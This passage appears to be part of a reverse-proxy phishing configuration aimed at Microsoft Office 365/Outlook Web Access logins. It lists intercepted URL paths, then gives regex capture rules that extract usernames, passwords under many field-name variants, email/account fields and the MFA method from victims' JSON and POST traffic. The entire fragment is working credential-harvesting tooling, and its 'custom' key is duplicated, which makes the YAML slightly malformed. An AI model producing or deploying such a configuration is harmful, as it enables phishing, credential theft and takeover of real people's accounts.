  - "/webmanifest.json*"
  - "/landing*"
  - "/landingv2*"
  - "/owa/prefetch.aspx*"
  - "/webmanifest.json*"
  - "v1/api/pass/o365/header"

#╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦(ＣＲＥＤＥＮＴＩＡＬＳ)╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦#
credentials:
  username:
    key: ""
    search: '"username":"([^"]*)'
    type: "json"
  password:
    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
    search: '(.*)'
    type: "post"
  custom:
    - key: (login|UserName|username|email|account)
      search: '(.*)'
    - key: ""
      search: '"password":"([^"]*)'
      type: "json"
  custom:
    - key: 'mfaAuthMethod'
      search: '(.*)'
      type: 'post'

